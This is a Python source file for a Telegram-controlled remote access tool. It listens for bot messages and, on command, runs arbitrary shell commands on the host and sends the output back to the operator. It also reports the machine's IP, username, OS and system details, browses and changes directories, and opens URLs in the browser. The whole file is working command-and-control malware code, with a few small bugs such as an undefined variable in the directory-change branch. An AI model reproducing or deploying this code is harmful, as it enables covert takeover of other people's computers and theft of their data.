import telepot
from telepot.loop import MessageLoop
from time import sleep
import getip
import subprocess
from sysinfo import getsysinfo
import webbrowser
import os
import platform

#Here you enter your API like  (514659315:AkFPt_8_hv1aypvMtPyA9JmS0halHxhhX74)
HTTPbased = ""

def bot():
    return telepot.Bot(HTTPbased)

def SendMessage(idmsg, textmsg):
    try:
        BotSendMsg = bot()
        BotSendMsg.sendMessage(idmsg,
                               textmsg)
    except telepot.exception.TelegramError:
        pass
    
def cmd(cmd):
    output = subprocess.run(cmd,
                            shell=True,
                            stdout=subprocess.PIPE,
                            universal_newlines=True)
    return output.stdout

def lstdir():
    path = os.getcwd()
    listdir = os.listdir(path)
    list = "lsdir:"
    for file in listdir:
        list += ("\n{}".format(file))
    return list
    
def CheckOnline():
    IP = getip.get()
    login = os.getlogin()
    OS = platform.platform()
    info = ("""

IP   : {}
USER : {}
OS   : {}""".format(IP,
                  login,
                  OS
                  )
)
    return info
    
def SystemInfo():
    output = getsysinfo()
    return output

def openbrowser(url):
    webbrowser.open(url)

def SendMessage(idmsg, textmsg):
    try:
        BotSendMsg = bot()
        BotSendMsg.sendMessage(idmsg,
                               textmsg)
    except telepot.exception.TelegramError:
        pass
    
def MessageAnalysis(msg):
    ip = getip.get()
    Msgtext, Msgtype, Msgid = telepot.glance(msg)
    #print("id:",Msgid)
    if Msgtext == "text":
        Msg = str(msg['text'])
        Msg = Msg.split()
        if Msg[0] == "online?" :
            Online = CheckOnline()
            SendMessage(Msgid, Online)
        elif Msg[0] == ip or Msg[0] == "all":
            del Msg[0]
            if Msg[0] == "cmd":
                del Msg[0]
                cmnd = ' '.join(Msg)
                outCmd = cmd(cmnd)
                SendMessage(Msgid, outCmd)
            elif Msg[0] == "sysinfo":
                sysinfo = SystemInfo()
                SendMessage(Msgid, sysinfo)
            elif Msg[0] == "url":
                del Msg[0]
                browsermsg = ''.join(Msg)
                openbrowser(browsermsg)
            elif Msg[0] == "lsdir":
                outlist = lstdir()
                SendMessage(Msgid, outlist)
            elif Msg[0] == "cd":
                try:
                    os.chdir(Msg[1])
                    cdmsg = "Done"
                except FileNotFoundError:
                    cdmsg = ("File not found: {}".format(Msg[1]))
                SendMessage(Msgid, chmsg)
            elif Msg[0] == "path":
                path = os.getcwd()
                SendMessage(Msgid, path)

            
def main():
    BotMsgLoop = bot()
    MessageLoop(BotMsgLoop, MessageAnalysis).run_as_thread()

    while True:
        pass
if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        pass

